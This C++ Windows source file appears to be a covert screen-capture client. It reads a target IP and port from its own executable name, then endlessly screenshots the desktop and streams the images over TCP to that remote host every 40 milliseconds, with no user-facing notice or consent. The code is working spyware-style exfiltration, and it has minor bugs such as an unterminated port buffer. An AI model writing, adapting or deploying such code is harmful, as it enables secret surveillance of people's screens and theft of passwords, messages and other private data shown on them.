#define NOMINMAX

#include <algorithm>
using namespace std;
#include <iostream>
#include <windows.h>
#include <gdiplus.h>
#include <winsock.h>
#include <fstream>
#include <string>
#include <vector>

#pragma warning( disable : 4996)
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "GdiPlus.lib")
using namespace Gdiplus;

void readIp(char* argv[], char *ip, int& port)
{
    char chport[5];
    int i = 0;

    for (; i < 4; ++i)
        chport[i] = argv[0][i];
    sscanf_s(chport, "%d", &port);
    int k = 0;
    while (argv[0][i])
    {
        ip[k] = argv[0][i];
        ++k; ++i;
    }
    ip[k] = '\0';
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    UINT  num = 0;          // number of image encoders
    UINT  size = 0;         // size of the image encoder array in bytes

    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1;  // Failure

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1;  // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j)
    {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return j;  // Success
        }
    }

    free(pImageCodecInfo);
    return -1;  // Failure
}

bool save_png_memory(HBITMAP hbitmap, std::vector<char>& data)
{
    Gdiplus::Bitmap bmp(hbitmap, nullptr);

    //write to IStream
    IStream* istream = nullptr;
    CreateStreamOnHGlobal(NULL, TRUE, &istream);

    CLSID   encoderClsid;
    Status  stat;
    EncoderParameters encoderParameters;
    ULONG    quality;

    GetEncoderClsid(L"image/jpeg", &encoderClsid);

    encoderParameters.Count = 1;
    encoderParameters.Parameter[0].Guid = EncoderQuality;
    encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
    encoderParameters.Parameter[0].NumberOfValues = 1;

    quality = 15;
    encoderParameters.Parameter[0].Value = &quality;
    GetEncoderClsid(L"image/jpeg", &encoderClsid);

    Gdiplus::Status status = bmp.Save(istream, &encoderClsid, &encoderParameters);
    if (status != Gdiplus::Status::Ok)
        return false;

    //get memory handle associated with istream
    HGLOBAL hg = NULL;
    GetHGlobalFromStream(istream, &hg);

    //copy IStream to buffer
    int bufsize = GlobalSize(hg);
    data.resize(bufsize);

    //lock & unlock memory
    LPVOID pimage = GlobalLock(hg);
    memcpy(&data[0], pimage, bufsize);
    GlobalUnlock(hg);

    istream->Release();
    return true;
}

int main(int argc, char* argv[])
{
    int port = 0;
    char ip[20];

    readIp(argv, ip, port);

    WSADATA WsaData;
    char sendingImageInfo[50];
    int check = 0;
    const int imagePartSize = 1024;
    if (WSAStartup(0x0101, &WsaData))
        return false;
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET)
        return FALSE;
    SOCKADDR_IN sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.S_un.S_addr = inet_addr(ip);

    fd_set fd;
    timeval tv;
    FD_ZERO(&fd);
    FD_SET(s, &fd);
    tv.tv_sec = 5;
    tv.tv_usec = 0;

    if (connect(s, (struct sockaddr*)&sin, sizeof(struct sockaddr)))
        return FALSE;
    char start[10] = "start";
    char startBuffer[10];

    while (true)
    {
        //--------------------------------------------------------------
        CoInitialize(NULL);

        ULONG_PTR token;
        Gdiplus::GdiplusStartupInput tmp;
        Gdiplus::GdiplusStartup(&token, &tmp, NULL);

        //take screenshot
        RECT rc;
        GetClientRect(GetDesktopWindow(), &rc);
        auto hdc = GetDC(0);
        auto memdc = CreateCompatibleDC(hdc);
        auto hbitmap = CreateCompatibleBitmap(hdc, rc.right, rc.bottom);
        auto oldbmp = SelectObject(memdc, hbitmap);
        BitBlt(memdc, 0, 0, rc.right, rc.bottom, hdc, 0, 0, SRCCOPY);
        SelectObject(memdc, oldbmp);
        DeleteDC(memdc);
        ReleaseDC(0, hdc);

        //save as png
        std::vector<char> data;
        if (save_png_memory(hbitmap, data))
        {
            std::string imageInfo;
            imageInfo = std::to_string(data.size());
            for (int i = 0; i < imageInfo.size(); ++i)
            {
                sendingImageInfo[i] = imageInfo[i];
            }
            sendingImageInfo[imageInfo.size()] = '\0';

            int ImagePartCounter = 0;

            check = send(s, start, 10, 0);

            if (check != 10)
                exit(0);

            check = send(s, sendingImageInfo, 50, 0);

            if (check != 50)
                exit(0);

            check = send(s, data.data(), data.size(), 0);

            if (check != data.size())
                exit(0);
        }
        DeleteObject(hbitmap);

        Gdiplus::GdiplusShutdown(token);
        CoUninitialize();
        //--------------------------------------------------------------
        Sleep(40);
    }
}
